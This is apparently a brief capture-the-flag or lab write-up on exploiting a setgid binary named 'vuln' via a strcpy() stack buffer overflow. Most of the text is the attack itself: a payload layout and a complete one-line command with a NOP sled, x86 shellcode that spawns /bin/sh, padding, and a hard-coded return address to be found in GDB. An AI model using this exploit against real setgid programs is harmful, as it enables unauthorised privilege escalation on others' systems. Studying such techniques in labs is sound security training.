`vuln` has setgid bit. If we could find a way to change the flow of vuln, we can do it with owner group's rights.

strcpy() is vulnerable to bufferoverflow. First thing first, we try to crash the programm. We look for the offset of RET, we can use gdb for eg.
We have to find a valid shellcode, we add NOP and JUNK.

PAYLOAD : NOP*100 + SHELLCODE*25 + JUNK*143 + RET*4
Example : ./vuln $(python -c "print '\x90'*100 + '\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80' + 'A'*143 + '\x50\xfd\xff\xbf'") #RET can change ! Find it manually with GDB
